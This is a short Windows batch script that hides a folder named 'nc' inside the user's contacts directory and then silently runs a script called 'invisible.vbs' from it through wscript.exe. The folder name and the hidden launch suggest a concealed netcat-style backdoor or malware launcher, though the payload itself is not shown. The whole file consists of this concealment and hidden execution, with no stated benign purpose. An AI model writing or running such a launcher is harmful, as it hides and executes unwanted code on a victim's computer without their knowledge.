@echo off
cd /d "C:/users/%USERNAME%/contacts/nc/"
cd ..
attrib +h nc
cd C:/users/%USERNAME%/contacts/nc/
wscript.exe invisible.vbs DECODED

